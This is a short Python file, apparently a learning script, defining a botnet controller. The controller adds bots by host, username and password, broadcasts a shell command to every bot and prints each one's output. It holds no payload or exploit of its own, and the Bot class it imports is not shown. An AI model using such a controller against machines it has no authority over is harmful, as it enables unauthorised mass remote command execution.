from bot import Bot


class Controller:
    def __init__(self):
        self.botnet = []

    def command_bots(self, command):
        for bot in self.botnet:
            attack = bot.send_command(command)
            print(f"Output from [{bot.user}@{bot.host}]:")
            print(attack.decode("utf-8"))

    def add_bot(self, host, user, password):
        new_bot = Bot(host, user, password)
        if new_bot.session:
            self.botnet.append(new_bot)
            return True
        print("Bots in the network:")
        print(self.botnet)
        return False
